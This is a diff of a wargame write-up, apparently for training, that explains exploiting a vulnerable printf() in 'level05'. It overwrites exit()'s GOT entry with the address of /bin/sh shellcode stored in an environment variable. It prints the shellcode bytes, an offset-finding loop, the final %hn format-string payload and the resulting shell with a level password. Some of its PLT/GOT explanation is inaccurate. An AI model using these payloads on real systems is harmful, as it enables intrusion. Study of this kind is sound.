@@ -10,19 +10,35 @@ Functions found using `(gdb) info functions`
 |exit||
 
 Here we can see a vulnerable `printf()` since the printed string is passed raw as an argument.
+It is followed by a call to `exit()`, therefore overwriting the return address of the `main()` function is not a viable option.
 
-info proc mappings
-find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
+Notice that `checksec --file level05` tells us that there is `No RELRO`. Consequently, we can then overwrite the `exit()` function on the **PLT (Procedure Linkage Table)** that points to on the **GOT (Global Offset Table)**. The **PLT** is program dependant whereas the **GOT** is system wide and immutable.
 
-0xf7f897ec < address of /bin/sh
+In a nutshell it works like this
 
-0x8048370 < address of exit
+|function symbol|PLT address|address stored there|address stored there (GOT)|code pointed to|
+|-|-|-|-|-|
+|**exit()**|0x**0804**|0x**0901**|0x**7fe5**|**exit()** in the **LIBC**|
+|||v|||
+|||0x**12f4**|>|*shellcode*|
 
-0xf7e6aed0 < address of system
+*the adresses here are for example's sake*
 
+When a program is started, every *function symbol* (the names in the source code) gets assigned an address on the **PLT**.
+
+When the program reaches this *function call*, the **PLT** will link the corresponding address on the **GOT** to it.
+In the example, `exit()` gets assigned the address 0x**7f0a** on the **PLT**. When `exit()` is called for the first time, 0x**0901** will be stored at the address 0x**7f0a**.
+
+0x**0901** is an address on the **GOT**, this address itself points to the address of `exit()` in the compiled LIBC.
+
+Our goal will be to overwrite the address stored at 0x**7f0a** to be 0x**12f4**, the address of our **shellcode**.
+
+Now when `exit()` is called it is redirected to our **shellcode** instead of `exit()` in the **LIBC**.
+
+# Demonstration
 
 ```sh
-# Now to find the address of pointed to by the `exit` plt
+# We need to find the address of pointed to by the `exit` symbol on the plt
 gdb ./level05
 p exit
 	$1 = {<text variable, no debug info>} 0x8048370 <exit@plt>	# This is the address of exit() on the plt
@@ -33,26 +49,37 @@ x/i 0x8048370
 # See NOTE at the bottom for more information
 ```
 
-<!-- explain the shellcode injection and address finding process -->
+Now we need to put our **shellcode** in the environment so that we can execute it later.
 
 ```sh
 export SHELL_CODE=$(python -c 'print("\x90" * 30 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")')
 
+
+# Then we need to find an address we can jump to in order to execute our shellcode
 gdb ./level05
 x/150s environ
 [...]
-0xffffdf17:	"SHELL_CODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀"
+0xffffdf17:	"SHELL_CODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀" # This is the environment variable, including the `key`
 [...]
 
 x/s 0xffffdf24
-0xffffdf24:	"\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀"
+0xffffdf24:	"\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀" # If we offset the `key`'s address by 13, we land in the middle of our `value` which contains a nop slide which will bring us directly to our shellcode
 ```
 
+Finally we have to find a way to overwrite the value stored on the **PLT**
 
-<!-- finish argument position explanation -->
+We will use a `printf()` [string format attack](https://dev.to/duracellrabbid/journey-to-understand-format-string-attack-part-1-5dda). Basically, we pass an address as a **string-payload** to `printf()` and then we trick `printf()` into writing on this address as if it were a pointer.
+
+But to do this we need to find the address where our **string-payload** is written.
+
 ```sh
 for i in $(seq 1 24); do (echo -n "$i : "; python -c "print('aaaa %$i\$p');" | ./level05); done;
+[...]
+10 : aaaa 0x61616161 # < 'aaaa' in hexadecimal, so printf()'s `argument 10` is where our string-payload will be located
+[...]
 ```
+
+Now, this is where it gets _really_ **_really_** **complicated**. Ask Alec to make a drawing that will explain it all.
 
 Our payload will look like this
 
@@ -64,9 +91,18 @@ Our payload will look like this
 See **NOTE2** for a more in-depth explanation on this part.
 
 ```sh
+# Do not forget to export the shellcode
+
 (cat <(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57116c" + "%10$hn" + "%8411c" + "%11$hn");') -) | ./level05
+[...]
+whoami
+level06
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
 ```
-This level was easy to understand but hard to solve :|
+This level was easy to understand but hard to solve and even harder to explain :|
+
+It is the sum of multiple complicated concepts and exploits.
 
 NOTE:
 ```sh
